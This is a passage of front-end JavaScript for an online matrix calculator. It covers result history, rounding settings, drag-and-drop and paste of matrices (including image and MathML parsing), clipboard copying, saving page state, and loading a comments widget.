    // and for https://webcache.googleusercontent.com/search?q=cache:https://matrixcalc.org/
    // "#" cause scrolling to the top of an iframe in Chrome on iframe's "onload"
    window.history.replaceState(window.history.state, document.title, window.location.href.replace(/#[^#]*$/g, '') + hash);
};

Utils.on("click", ".clear-all-button", function (event) {
  var actHistory = actHistoryStorage._getActHistory();
  
  hit({click: "clear-all-button"});
  document.getElementById("resdiv").textContent = "";
  actHistoryStorage.clear();
  //!
  lastHash = "";
  setLocationHash("");

  //TODO: undo for single item removal (!)
  var undoButton = document.getElementById('undo-clear-button');
  undoButton.onclick = function () {
    //TODO: set all at once (?)
    for (var id in actHistory) {
      if (Object.prototype.hasOwnProperty.call(actHistory, id)) {
        var item = actHistory[id].item;
        actHistoryStorage.setItem(id, item);//TODO: id
        zInsAct(item.resultHTML,
                item.resultMatrix,
                item.details,
                item.expressionString,
                id,
                item.detailsHTML,
                {isLoading: true});
      }
    }
    undoButton.onclick = null;
    undoButton.disabled = true;
    undoButton.hidden = true;//TODO: !?
  };
  undoButton.disabled = false;
  undoButton.hidden = false;
});


Utils.initialize(".decimal-fraction-digits-controls", function (element) {
  var checkbox = document.getElementById("decfraccheckbox");
  var digitsValueInput = document.getElementById("frdigits");
  var roundingTypeSelectBox = document.getElementById("rounding-type") || document.createElement('select');
  var span = document.getElementById("frdigitsspan");
  var onDecimalFractionDigitsChange = function (event) {
    if (event != undefined) { // initialization
      hit({click: "onDecimalFractionDigitsChange"});
    }
    var useDecimalFractions = checkbox.checked;
    var value = Math.floor(Number(digitsValueInput.value) || 0);
    span.hidden = !useDecimalFractions;
    var roundingType = roundingTypeSelectBox.value || "fractionDigits";
    if (roundingType === "fractionDigits") {
      decimalRounding = useDecimalFractions ? {fractionDigits: Math.max(value, 0)} : undefined;
      digitsValueInput.min = 0;
    } else if (roundingType === "significantDigits") {
      decimalRounding = useDecimalFractions ? {significantDigits: Math.max(value, 1)} : undefined;
      digitsValueInput.min = 1;
    } else {
      //?
    }
    if (event != undefined) {
      keyStorage.setItem("decfraccheckbox", useDecimalFractions ? "true" : "false");
      keyStorage.setItem("frdigits", value.toString());
      keyStorage.setItem("roundingType", roundingType);
    }
  };
  checkbox.addEventListener("change", onDecimalFractionDigitsChange, false);
  digitsValueInput.addEventListener("change", onDecimalFractionDigitsChange, false);
  roundingTypeSelectBox.addEventListener("change", onDecimalFractionDigitsChange, false);
  var checked = keyStorage.getItem("decfraccheckbox");
  var value = keyStorage.getItem("frdigits");
  var roundingType = keyStorage.getItem("roundingType");
  if (checked != undefined) {
    checkbox.checked = checked === "true";
  }
  if (value != undefined) {
    digitsValueInput.value = value; // updateInputValue may not work with <input type="number" /> in Firefox
  }
  if (roundingType != undefined) {
    roundingTypeSelectBox.value = roundingType;
  }
  window.setTimeout(function () { // Chrome
  onDecimalFractionDigitsChange(undefined); // autofill + localStorage
  }, 0);
});

//TODO: bug - ?
//TODO: seems, "paste" is not fired on <button> elements
document.addEventListener('paste', function (event) {
  var e = document.activeElement;
  if (e != null && e.tagName.toLowerCase() === 'button' && event.target !== e) {
    var extraEvent = new Event('paste');
    extraEvent.clipboardData = event.clipboardData; // TODO:
    e.dispatchEvent(extraEvent);
  }
}, false);

var DnD = {};
DnD.initializeDropZone = function (element) {
  element.setAttribute("dropzone", "copy string:text/plain string:application/mathml-presentation+xml");
  element.addEventListener("dragenter", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("dragover", DnD.onDragEnterOrDragOver, false);
  element.addEventListener("drop", DnD.onDropOrPaste, false);
  element.addEventListener("paste", DnD.onDropOrPaste, false);
  element.addEventListener("beforepaste", function (event) {
    event.preventDefault();
  }, false);
};
DnD.onDragEnterOrDragOver = function (event) {
  if (event.target == undefined || event.target.nodeType !== Node.ELEMENT_NODE || (event.target.tagName.toLowerCase() !== 'textarea' && event.target.tagName.toLowerCase() !== 'input')) {
    event.dataTransfer.dropEffect = "copy";
    event.preventDefault();
  }
};
// reimplementation of the default drop or paste insertion
DnD.textDropOrPaste = function (input, insertion, caretPosition, isDrop) {
  input.focus();//!
  if (caretPosition !== -1) { // isDrop is true
    input.setSelectionRange(caretPosition, caretPosition);
  }
  var selectionStart = input.selectionStart;
  //var selectionEnd = input.selectionEnd;
  if (input.hasAttribute('contenteditable') && input.getAttribute('aria-multiline') !== 'true') {
    insertion = insertion.replace(/[\r\n]/g, '');
  }
  insertText(insertion, input);
  // insetText does not scroll to selection (!) in Chrome
  input.setSelectionRange(selectionStart + (isDrop ? 0 : insertion.length), selectionStart + insertion.length);// force scrolling
  // TODO: force the scrolling in Chrome
  //input.dispatchEvent(new Event('input'));
  //TODO: what if the effect was "cut" - ? it should be done by the browser
};

DnD.getTextData = function (dataTransfer, callback) {
  //TODO: MathML support (?)
  // MathML in text
  var text = dataTransfer.getData('text/plain') || '';

  //!new 2020-04-05
  var files = dataTransfer.files || [];
  if ((typeof TextDetector !== 'undefined' || /^data\:image\/svg\+xml[;,]/.test(text) || files.length === 1 && files[0].type === 'image/svg+xml') &&
      // a file OR a data URL or a link
      ((text === '' && files.length === 1 && files[0].type.indexOf('image/') === 0) || /^data\:image\/\S+\,/.test(text) || /^(ftp|https?)\:\S+/.test(text))) {
    (text.startsWith('data:') || text.startsWith('https:') || text.startsWith('http:') || text.startsWith('ftp:') ? fetch(text, {credentials: 'include'}).then(function (response) { return response.blob(); }) : Promise.resolve(files[0])).then(function (imageFile) {
      if (imageFile.type === 'image/svg+xml') {
        imageFile.text().then(function (text) {
          var svg = new DOMParser().parseFromString(text, 'image/svg+xml').firstElementChild;
          document.body.appendChild(svg);
          var textBlocks = [];
          var es = svg.querySelectorAll('text');
          for (var i = 0; i < es.length; i += 1) {
            var text = es[i];
            textBlocks.push({
              boundingBox: text.getBoundingClientRect(),
              rawValue: text.textContent
            });
          }
          text = getMatrixFromTextBlocks(textBlocks);
          callback(text);
        });
      } else {
        var loadImage = function (imageFile) {
          return new Promise(function (resolve, reject) {
            var src = URL.createObjectURL(imageFile);
            var img = new Image();
            img.onload = function () {
              //TODO:
              // tesseract still needs the image URL (?)
              //URL.revokeObjectURL(url);
              resolve(img);
            };
            img.onerror = function (error) {
              //TODO:
              // tesseract still needs the image URL (?)
              //URL.revokeObjectURL(url);
              reject(error);
            };
            img.src = src;
          });
        };
        // Uncaught (in promise) Error: NotSupportedError: Unsupported source. in Chrome 86 for File
        loadImage(imageFile).then(function (img) {
          var textDetector = new TextDetector();
          textDetector.detect(img).then(function (textBlocks) {
            if (textBlocks.length === 0) {
              throw new Error('no text blocks detected');
            }
            var text = getMatrixFromTextBlocks(textBlocks);
            callback(text);
          })['catch'](function (error) {
            throw new Error(error);
          });
        });
      }
    });
    return null;
  }

  // 1x+2y=0
  // 3x+4y=0

  // {{1,2},{3,4}}

  // 1\t2\t3
  // 4\t5\t6
  // 7\t8\t9
  var mathText = text || dataTransfer.getData('application/mathml-presentation+xml') || '';
  if (/^\s*<math[^>]*>/.test(mathText) && /<\/math>\s*$/.test(mathText)) {
    text = transformMathML(parseMathML(mathText), 'AsciiMath').string;
    callback(text);
    return null;
  }

  callback(text);
  return null;
};

DnD.onDropOrPaste = function (event) {
  var target = this;
  var input = event.target;
  var caretPosition = event.type === "paste" || (event.clientX === 0 && event.clientY === 0) ? -1 : document.caretPositionFromPoint(event.clientX, event.clientY).offset;
  var isDrop = event.type === "drop";
  var dataTransfer = event.type === "paste" ? event.clipboardData : event.dataTransfer;
  var tableId = target.getAttribute('data-matrix-table');
  var plainText = dataTransfer.getData('text/plain');
  var hasSpecialData = DnD.hasInterestingData(dataTransfer) &&
                       //plainText !== '' && // image insertion, default action is show the image, TODO: fix
                       /[^\w]/.test(plainText) && // try to not avoid default action as insertText is not works well in Firefox (undo/redo), TODO: fix
                       (plainText.indexOf('=') === -1 || (tableId != null && !(MatrixTables[tableId].mode !== 'cells' && input.tagName.toLowerCase() === 'textarea' && MatrixTables[tableId].type === 'system')) || plainText === '') &&
                       (/[\t\n\r]/.test(plainText) && input.tagName.toLowerCase() === 'input' || tableId != null || plainText === '');
  //!!!
  //TODO: test (insertion of `x+y=2,y=1` into a textarea for a system of linear equations
  //TODO: insertion of "1 2\n3 4" into a textarea
  //TODO: insertion of "1\t2\t3\n" into a textarea with text "4\t5\t6\n" at the end
  var isEditable = input.tagName.toLowerCase() === 'input' || input.tagName.toLowerCase() === 'textarea' || input.hasAttribute('contenteditable');
  DnD.getTextData(dataTransfer, function (text) {
    var isPlainText = text === plainText;
    if (isPlainText && !hasSpecialData && isEditable) {
      DnD.textDropOrPaste(input, text, caretPosition, isDrop);
    } else {
      RPNProxy.getMatrix(text, function (tmp) {
        var elements = tmp.elements;
        var variableNames = tmp.variableNames;
        if (elements != undefined && tableId != null) {
          //TODO: do not insert zeros when there are a lot of them (!)
          MatrixTables[tableId].insert({
            inputValues: elements,
            variableNames: variableNames
          });
        } else if (elements != undefined && target.tagName.toLowerCase() === 'button') {// .add-table
          target.click();
          //TODO:
          var newTableId = document.querySelector('.main').lastElementChild.querySelector('.insert-table').getAttribute('data-id');
          MatrixTables[newTableId].insert({
            inputValues: elements,
            variableNames: variableNames
          });
        } else if (elements != undefined && isEditable) {
          //TODO: test, fix (spaces, decimal commas - ?)
          DnD.textDropOrPaste(input, '{' + elements.map(function (row) { return '{' + row.map(function (cell) { return cell.trim(); }).join(', ') + '}'; }).join(',') + '}', caretPosition, isDrop);
        } else if (isEditable) {
          DnD.textDropOrPaste(input, text, caretPosition, isDrop);
        } else {
          throw new TypeError('drop or paste of ' + text);
        }
      }, function (resultError) {
        if (isEditable) {
          DnD.textDropOrPaste(input, text, caretPosition, isDrop);
        } else {
          var positionInfo = RPNProxy.getPositionInfo();
          handleError(text, isDrop ? 'drop' : 'paste', resultError, positionInfo);
        }
      });
    }
  });
  event.preventDefault();
};

globalThis.DnD = DnD;

// see also https://bugzilla.mozilla.org/show_bug.cgi?id=1012662

var checkIfCanCopy = function () {
  var isCollapsed = window.getSelection().isCollapsed || document.getElementById("copy-fix") != undefined;
  if (!isCollapsed) {
    return undefined;
  }
  var target = document.activeElement;
  if (target == undefined ||
      target.classList == undefined) {
    return undefined;
  }
  if (target.classList.contains("matrix-menu-show")) {
    target = document.getElementById(target.getAttribute("data-for-matrix"));
  }
  if (target.getAttribute("data-matrix") == undefined &&
      !target.classList.contains("matrix-table-inner")) {
    return undefined;
  }
  return target;
};

document.addEventListener("beforecopy", function (event) {
  if (checkIfCanCopy() != undefined) {
    event.preventDefault();
  }
}, false);

var onCopy = function (event) {
  var dataTransfer = event.clipboardData;
  var target = checkIfCanCopy();
  if (target != undefined) {
    event.preventDefault();
    if (target.getAttribute("data-matrix") != undefined) {
      var matrixContainer = target;
      hit({click: "copy-matrix-container"});
      dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(matrixContainer));
      dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"))) + "\n");
    } else {
      hit({click: "copy-matrix-table"});
      var tableName = target.getAttribute("data-for");
      var matrixTableState = MatrixTables[tableName].getDataState();
      var tmp = RPN.getElementsArray(matrixTableState);
      //dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrix.toString())) + "\n");
      //presave decimals:
      dataTransfer.setData("text/plain", "\n" + toMultilineString(tmp.elements) + "\n");
      //! set the text/plain data before the xml as Matrix.toMatrix may throw an error
      var matrix = Matrix.toMatrix(tmp.elements);
      dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(parseMathML(new Expression.Matrix(matrix).toMathML({idPrefix: "g", rounding: decimalRounding, useMatrixContainer: false}))));
    }
  }
};

document.addEventListener("copy", onCopy, false);

// It works in Firefox
document.addEventListener("contextmenu", function (event) {
  var target = event.target.closest("[data-matrix]");
  if (target != undefined) {
    hit({click: "contextmenu"});
    prepareMatrixMenu(target.id);
  }
}, false);
document.addEventListener("dragstart", function (event) {
  var target = event.target;
  //while (target != undefined && (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == undefined)) {
  //  target = target.parentNode;
  //}
  if (target.nodeType !== Node.ELEMENT_NODE || target.getAttribute("data-matrix") == null) {
    target = null; // !window.getSelection().isCollapsed
  }
  if (target != undefined) {
    var matrixContainer = target;
    hit({click: "dragstart"});
    var dataTransfer = event.dataTransfer;
    dataTransfer.effectAllowed = "copy";
    dataTransfer.setData("application/mathml-presentation+xml", serializeMatrixContainer(matrixContainer));
    dataTransfer.setData("text/plain", "\n" + toMultilineString(getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"))) + "\n");
  }
}, false);

var growTimeoutId = 0;

var grow = function (element, clipElement, listContainer) {
  if (Element.prototype.animate != undefined) {
    var rect = element.getBoundingClientRect();
    var from = rect.top - rect.bottom;
    var animationDuration = 400;
    var a = function (element) {
      element.animate([
        {transform: "translateY(" + from.toString() + "px)"},
        {transform: "translateY(0px)"}
      ], {
        duration: animationDuration,
        composite: "add"
      });
    };
    if (true) {
      var viewportHeight = window.innerHeight;
      var clipRect = listContainer.getBoundingClientRect();
      var visibleHeight = viewportHeight - clipRect.top;
      //console.log(clipRect.top, clipRect.bottom, viewportHeight, h);
      var c = listContainer.firstElementChild;
      var h = visibleHeight;
      while (c != null && h > 0) {
        var childRect = c.getBoundingClientRect();
        h -= childRect.bottom - childRect.top;
        c = c.nextElementSibling;
      }
      var child = listContainer.firstElementChild;
      while (child != null && child !== c) {
        a(child);
        child = child.nextElementSibling;
      }
    } else {
      a(listContainer);
    }
    //TODO: clip-path (?)
    // Note: change the style here to avoid double style recalculation
    clipElement.style.overflowY = "hidden";
    window.clearTimeout(growTimeoutId);
    growTimeoutId = window.setTimeout(function () {
      // horizontal scrollbar should be shown for very large matrices
      clipElement.style.overflowY = "visible";
    }, animationDuration);
  }
};

var onPrintMatrix = function (event) {
  hit({click: "print-matrix-menuitem"});
  var matrixTableId = this.id.slice("print-matrix-menuitem-".length);
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  var matrixElements = getTableFromAsciiMathMatrix(matrixContainer.getAttribute("data-matrix"));
  MatrixTables[matrixTableId].insert({inputValues: matrixElements});//TODO: system - ?
};

var onPrintMatrixIntoNewTable = function (event) {
  document.querySelector(".add-table").click();
  this.id = "print-matrix-menuitem-" + Object.keys(MatrixTables).sort().slice(-1).join("");
  onPrintMatrix.call(this, event);
};

Utils.on("click", ".print-matrix-button", function (event) {
  hit({click: "print-matrix-button"});
  var actHistoryId = this.getAttribute("data-act-history-id");
  var item = actHistoryId.slice(0, 1) === "#" ? {resultMatrix: actHistoryId.slice(1)} : actHistoryStorage.getItem(Number(actHistoryId));
  var matrixElements = getTableFromAsciiMathMatrix(item.resultMatrix);
  MatrixTables[this.getAttribute("data-print-matrix-to")].insert({inputValues: matrixElements});//TODO: system - ?
});

Utils.on("click", ".clear-button", function (event) {
  hit({click: "clear-button"});
  var p = this.closest(".actline");
  p.parentNode.removeChild(p);
  var actHistoryId = this.getAttribute("data-act-history-id");
  if (actHistoryId.slice(0, 1) !== "#") {
    actHistoryStorage.removeItem(Number(actHistoryId));
  }
});

var getInputErrorHTML = function (positionInfo, textMessage) {
  var input = positionInfo.input;
  var startPosition = positionInfo.startPosition;
  var endPosition = positionInfo.endPosition;
  //TODO: semantic elements - ?
  return textMessage + "\n" +
//         Utils.escapeHTML(input) +
         "<div class=\"input-error-wrapper\">" +
         (startPosition === -1 || endPosition === -1 ? Utils.escapeHTML(input) : Utils.escapeHTML(input.slice(0, startPosition)) + "<u class=\"input-error-position\"><span>" + Utils.escapeHTML(input.slice(startPosition, endPosition) || " ") + "</span></u>" + Utils.escapeHTML(input.slice(endPosition))) +
         "</div>";
};

  var removeDataErrorAttribute = function (input) {
    if (input.getAttribute("data-error") != null) {
      input.removeAttribute("data-error");
      input.dispatchEvent(new Event('update-attribute'));
    }
  };

  var updateDataErrorAttribute = function (input, error, positionInfo, extraPositionOffset) {
    extraPositionOffset = extraPositionOffset == undefined ? 0 : positionInfo.p;
    var message = error.message;
    var position = positionInfo.startPosition;
    var end = positionInfo.endPosition;
    if (message.indexOf("UserError:") === 0 || (position !== -1 && end !== -1)) {
      position += extraPositionOffset;//?
      end += extraPositionOffset;//?
      position = Math.min(position, input.value.length - 1);//TODO: fix ?
      end = Math.max(end, position + 1); // at least one character (textarea with EOF in the middle "sin ")
      end = Math.min(end, input.value.length);//?
      
      var delay = 0;
      if (end === input.value.length) {
        // trying not to blink with this error background
        delay = 1000;
      }
      var checkedValue = input.value;
      window.setTimeout(function () {
        if (checkedValue !== input.value) {
          return;
        }
      
      var dataError = position + "," + end;
      if (dataError !== input.getAttribute("data-error")) {
        input.setAttribute("data-error", dataError);
        input.dispatchEvent(new Event('update-attribute'));
      }
      
      }, delay);
      
      // no need to do an extra blinking
/*
      var onInput = function (event) {
        window.setTimeout(function () {
          input.removeEventListener("input", onInput, false);
          removeDataErrorAttribute(input);
        }, 0);
      };
      input.addEventListener("input", onInput, false);
*/
    }
  };

var onExpressionClick = function (event) {
  var expression = this.getAttribute("data-expression");
  var expressionInput = undefined;
  if (expression == undefined) {
    expressionInput = this.previousElementSibling.classList.contains("a-input") ? this.previousElementSibling.querySelector("input") : this.previousElementSibling;
    expression = expressionInput.value;
    // save
    keyStorage.setItem("expression", expression);
  }
  hit({onExpressionClick: expression});

  //?
  var kInput = this.parentNode.classList.contains("button-before-input") ? this.parentNode.querySelector("input") : undefined;
  var kInputValue = kInput == undefined ? undefined : kInput.value;
  var kInputId = kInput == undefined ? undefined : kInput.id;
  var matrixTableStates = {};
  for (var tableName in MatrixTables) {
    if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
      matrixTableStates[tableName] = MatrixTables[tableName].getDataState();
    }
  }

  var actHistoryId = (actHistoryStorage.actHistoryId += 1);
  var printOptions = {idPrefix: "i" + actHistoryId.toString(), rounding: decimalRounding};

  var classList = this.classList.toString();
  var start = Date.now();
  RPNProxy.runExpression(expression, kInputValue, kInputId, matrixTableStates, printOptions, function (result) {
    var resultError = result.resultError;
    var details = result.details;
    var expressionString = result.expressionString;
    var resultHTML = result.resultHTML;
    var resultMatrix = result.resultMatrix;
    var detailsHTML = result.detailsHTML;
    if (resultError == undefined) {
      lastHash = expressionString.replace(/[^\S\u200B]+/g, "");//?
      //? x+y=2, 2x=4
      setLocationHash("#" + encodeLocationHash(lastHash));
      zInsAct(resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, {isLoading: false});
      var end = Date.now();
      hit({click: "onExpressionClick-" + roundValue(end - start, 10 - 1)});
    } else {
      if (typeof resultError === "string") {
        resultError = new TypeError(resultError); // out of memory in Firefox
      }
      var positionInfo = RPNProxy.getPositionInfo();

      //TODO: show details anyway (!?)
      //!new - test
      if (resultError.message.indexOf("SingularMatrixException") === 0) {
        hit({click: "SingularMatrixException"});
        zInsAct("<div>" + i18n.inverse.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible + "</div>", "", details, expression, actHistoryId, detailsHTML, {isLoading: false});
      }
      //!new
      handleError(expression, classList, resultError, positionInfo);//?
    }
  });
};


var insertButtonsTemplate = document.createElement('div');

insertButtonsTemplate.innerHTML = '<div role="group" class="insert-buttons">' +
                                  '<div><button type="button" class="print-matrix-button" data-act-history-id="" data-print-matrix-to="A"></button></div>' +
                                  '<div><button type="button" class="print-matrix-button" data-act-history-id="" data-print-matrix-to="B"></button></div>' +
                                  '<div><button type="button" class="clear-button" data-act-history-id=""></button></div>' +
                                  '<div><button type="button" class="share-item-button" data-act-history-id="" title="" hidden></button></div>' +
                                  '</div>';

var zInsAct = function (resultHTML, resultMatrix, details, expressionString, actHistoryId, detailsHTML, options) {
  if (typeof resultHTML !== "string" || typeof resultMatrix !== "string") {
    throw new RangeError();
  }
  options = options || {};

  var element = document.createElement("li");
  element.classList.toggle("actline", true);
  element.id = "action-" + actHistoryId;

  var insertButtons = insertButtonsTemplate.firstElementChild.cloneNode(true);
  var buttons = insertButtons.querySelectorAll(".print-matrix-button");
  for (var i = 0; i < buttons.length; i += 1) {
    var to = buttons[i].getAttribute("data-print-matrix-to");
    buttons[i].textContent = document.getElementById('i18n-buttons-insertIn').textContent + ' ' + to;
    buttons[i].hidden = resultMatrix === "" || MatrixTables[to] == undefined;
    buttons[i].setAttribute("data-act-history-id", actHistoryId);
  }
  insertButtons.querySelector(".clear-button").textContent = document.getElementById('i18n-buttons-clear').textContent;// i18n.buttons.clear;
  insertButtons.querySelector(".clear-button").setAttribute("data-act-history-id", actHistoryId);

  var shareButton = insertButtons.querySelector(".share-item-button");
  if (shareButton != null) {
    shareButton.title = document.getElementById('i18n-appButtons-share').textContent;
    shareButton.hidden = window.navigator.share == null;
    shareButton.setAttribute("data-act-history-id", actHistoryId);
  }

  var add = function (html) {
    var div = document.createElement("div");
    div.innerHTML = html;
    while (div.firstChild != undefined) {
      element.appendChild(div.firstChild);
    }
  };
  element.appendChild(insertButtons);
  add(resultHTML);
  if (detailsHTML != undefined) {
    add(detailsHTML);
  }

  var resdiv = document.getElementById("resdiv");
  var resultsContainer = resdiv.firstElementChild;
  if (resultsContainer == undefined) {
    resultsContainer = document.createElement("ol");
    resultsContainer.id = "results-container";
    resdiv.appendChild(resultsContainer);
  }
  if (resultsContainer.firstChild == null) {
    resultsContainer.appendChild(element);
  } else {
    resultsContainer.firstChild.parentNode.insertBefore(element, resultsContainer.firstChild);
  }
  Utils.check(element);
  if (!options.isLoading) {
    if (options.fromHashChange) {
      element.scrollIntoView(true);
      //TODO: :target - ?
    } else {
      element.scrollIntoViewIfNeeded(false);
    }
    grow(element, resdiv, resultsContainer);//!
    actHistoryStorage.setItem(actHistoryId, new ActHistoryItem({
      resultHTML: resultHTML,
      resultMatrix: resultMatrix,
      details: details,
      expressionString: expressionString,
      actHistoryId: undefined,
      detailsHTML: detailsHTML,
      version: ActHistoryItem.version
    })); // string, string, string, string, number, string, number
  }
};

//TODO: assign id instead to the <details> - ?
function getKey(element) {
  var key = [];
  var e = element;
  while (e != null && e.id === '') {
    // https://stackoverflow.com/a/57503796/839199
    var index = 0;
    var c = e.previousElementSibling;
    while (c != null) {
      if (c.tagName.toLowerCase() === e.tagName.toLowerCase()) {
        index += 1;
      }
      c = c.previousElementSibling;
    }
    key.push(e.tagName.toLowerCase() + ':nth-of-type(' + index + ')');
    e = e.parentNode;
  }
  if (e != null) {
    key.push('#' + e.id);
  }
  key.reverse();
  return key.join(' > ');
}

// .details-container > <details> > <summary>
Utils.initialize("details", function (element) {
  //var details = element.firstElementChild;
  var details = element;
  var summary = details.firstElementChild;
  if (details.initDetails != null) {
    details.initDetails(summary);
  }
  details.addEventListener("toggle", function (event) {
    Utils.check1(event.target);
  }, false);
  details.addEventListener("toggle", function (event) {
    var element = event.target;
    var detailsAttribute = element.getAttribute("data-details");
    if (detailsAttribute == undefined) {
      return;
    }
    element.removeAttribute("data-details");
    var idPrefix = element.getAttribute("data-id-prefix");
    var printOptions = {idPrefix: idPrefix, rounding: decimalRounding};
    var x = JSON.parse(detailsAttribute);
    var e = element.firstElementChild.nextElementSibling;
    hit({details: x.type});//!
    RPNProxy.getDetails(x, printOptions, function (html) {
      var tmp = document.createElement('div');
      tmp.innerHTML = html;
      e.appendChild(tmp);
      Utils.check(tmp);
    });
  }, false);
  summary.addEventListener("mousedown", function (event) {
    if (event.detail > 1) {
      event.preventDefault();
    }
  }, false);

  //!new 2019-08-29
  // keep the state of <details> in the history.state:
    var historyState = window.history.state;
    if (historyState != null) {
      var state = historyState.detailsSummary;
      if (state != null) {
        var key = getKey(details);
        if (state[key] != null) {
          summary.click();
        }
      }
    }

});

function canSaveStateOnPageHide() {
  if (!('onpagehide' in window)) {
    return false; // IE 10
  }
  //TODO: fix
  //TODO: Chrome bug
  return !('onfreeze' in document); // it is not a Chrome
}

  window.addEventListener(!canSaveStateOnPageHide() ? "beforeunload" : "pagehide", function (event) {
    var detailsSummary = {};
    var es = document.querySelectorAll("details[open]");
    for (var i = 0; i < es.length; i++) {
      var key =  getKey(es[i]);
      detailsSummary[key] = true;
    }
    var historyState = Object.assign({}, window.history.state);
    historyState.detailsSummary = detailsSummary;
    window.history.replaceState(historyState, document.title, window.location.href);
  }, !canSaveStateOnPageHide() ? {once: true, passive: true} : false);

Utils.on("click", ".change-button", function (event) {
  hit({click: "change-button"});
  var s1 = this.getAttribute("data-for1");
  var s2 = this.getAttribute("data-for2");
  var table1 = MatrixTables[s1];
  var table2 = MatrixTables[s2];
  var t1 = table1.getState();
  var t2 = table2.getState();
  table1.insert(t2);
  table2.insert(t1);
});

// ---------------------------------------- cookies -----------------------------------------------

var onInputExampleLinkClick = function (event) {
  hit({click: "input-example-link"});


//super hack
  event.preventDefault();
  var s = this.parentNode.parentNode.querySelector(".input-example-code").textContent;
  s = s.replace(/\u0020+/g, " ").trim().replace(/\n\u0020/g, "\n");
  var mt = MatrixTables["A"];
  if (mt.mode === "cells") {
    mt.container.querySelector(".swap-mode-button").click();
  }
  updateInputValue(mt.textarea, s);
  // for some reasons `mt.textarea.focus()` does not scroll to show the full textarea in Chrome sometimes
  window.setTimeout(function () {
    mt.container.scrollIntoViewIfNeeded(false);
  }, 0);
};

Utils.initialize(".input-example-link-container", function (element) {
  element.firstElementChild.onclick = onInputExampleLinkClick;
});

Utils.initialize(".hypercomments-details-summary-container", function (element) {
  var details = element.querySelector("details");

  var showComments = function () {
    if (window._hcwp == undefined) {
      var WIDGET_ID = 8317;
      var link = document.getElementById("hc-link");
      link.hidden = false;
      window._hcwp = [{widget: "Stream", widget_id: WIDGET_ID, callback: function (app, init) {
         app.on("streamMessage", function (packet) {
           // html snapshot to help with the debugging
           window.sendSnapshot();
         });
      }}];

      window.HC_LOAD_INIT = true;
      // see https://www.hypercomments.com/en/documentation
      var lang = document.documentElement.lang.slice(0, 2).toLowerCase();
      var src = "https://w.hypercomments.com/widget/hc/" + WIDGET_ID + "/" + lang + "/widget.js";
      Utils.$import(src)["catch"](function (error) {
        toggleHidden(false);
        window._hcwp = undefined;
      });
      var toggleHidden = function (isLoading) {
        details.querySelector("progress").hidden = !isLoading;
        details.querySelector(".powered-text").hidden = !isLoading;
        details.querySelector(".cannot-load-text").hidden = isLoading;
      };
      toggleHidden(true);
    }
  };

  details.addEventListener("toggle", function (event) {
    showComments();
  }, false);

  var isMobile = true; // too big images

  var checkHash = function (event) {
    if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
      var hash = decodeLocationHash(window.location.hash.slice(1));
      if (!isMobile || hash.indexOf("hcm") !== -1 || hash.indexOf("hypercomments_widget") !== -1) {
        if (details.getAttribute("open") == undefined) {
          details.querySelector("summary").click();
        }
        showComments();
      }
    } else {
      details.hidden = true;
    }
  };
  checkHash(undefined);
  window.addEventListener("hashchange", checkHash, false);

});

// detfindDet

Utils.initialize(".insert-table", function (element) {
  var id = element.getAttribute("data-id");
  var sizes = element.getAttribute("data-sizes") || "";
  var type = element.getAttribute("data-type") || "simple";

  var initialRows = 3;
  var initialCols = 3;
  var match = (/^(\d+)x(\d+)$/).exec(sizes);
  if (match != undefined) {
    initialRows = Number(match[1]);
    initialCols = Number(match[2]);
  }

  var state = undefined;
  var stateKey1 = id + "1";
    var historyState = window.history.state;
    if (historyState != null && historyState[stateKey1] != null) {
      state = historyState[stateKey1];
    }

  if (state == undefined) {
    state = {
      mode: undefined,
      inputValues: null,
      textareaValue: null,
      rows: initialRows,
      cols: initialCols,
      textareaStyleWidth: undefined,
      textareaStyleHeight: undefined
    };
  }
  //TODO: do we need a title attribute at insert-table and why if we have <legend> ?
  var x = new MatrixTable(id, initialRows, initialCols, type, element);
  //element.style.visibility = "hidden";
  var modeKey = "~" + window.location.pathname + "~" + id + "~" + "mode";
  var mode = keyStorage.getItem(modeKey);
  if (mode == undefined) {
    var initialMode = undefined;
    //use the mode from the last table:
    for (var tableName in MatrixTables) {
      if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
        initialMode = MatrixTables[tableName].mode;
      }
    }
    if (initialMode == undefined) {
      //as table of inputs does not work well on mobile phones (on Android the virtual keyboard is swithed to the alphabetical on every focus change)
      initialMode = !window.matchMedia("(pointer: fine)").matches ? '' : 'cells';
    }
    mode = initialMode;
    //mode = x.mode;
  }
  MatrixTables[id] = x;
  x.mode = mode;
  x.insert(state);
  //element.style.visibility = "";
  x.onmodechange = function () {
    keyStorage.setItem(modeKey, x.mode);
  };
  x.onswapmode = function () {
    var newMode = x.mode === "cells" ? "" : "cells";
    RPNProxy.getElementsArray(x.getDataState(), function (result) {
      var elements = result.elements;
      var variableNames = result.variableNames;
      x.insert({
        inputValues: elements,
        mode: newMode,
        variableNames: variableNames
      });
    });
  };
  DnD.initializeDropZone(element);

});

  // TODO: save new tables to the history.state, don't restore old
    window.addEventListener(!canSaveStateOnPageHide() ? "beforeunload" : "pagehide", function (event) {
      var historyState = Object.assign({}, window.history.state);
      for (var tableName in MatrixTables) {
        if (Object.prototype.hasOwnProperty.call(MatrixTables, tableName)) {
          var stateKey1 = tableName + "1";
          historyState[stateKey1] = MatrixTables[tableName].getState();
        }
      }
      window.history.replaceState(historyState, document.title, window.location.href);
    }, !canSaveStateOnPageHide() ? {once: true, passive: true} : false);

Utils.on("click", ".expression-button", onExpressionClick);

Utils.on("click", ".expression-input-button", onExpressionClick);

Utils.initialize(".expression-input-container", function (element) {
  var input = element.querySelector("input");

  var form = element;
  addClickOnEnter(element);// focus is moved to button in IE 11 otherwise
  form.addEventListener('submit', function (event) {
    event.preventDefault();
  }, false);

  input.addEventListener("input", function (event) {
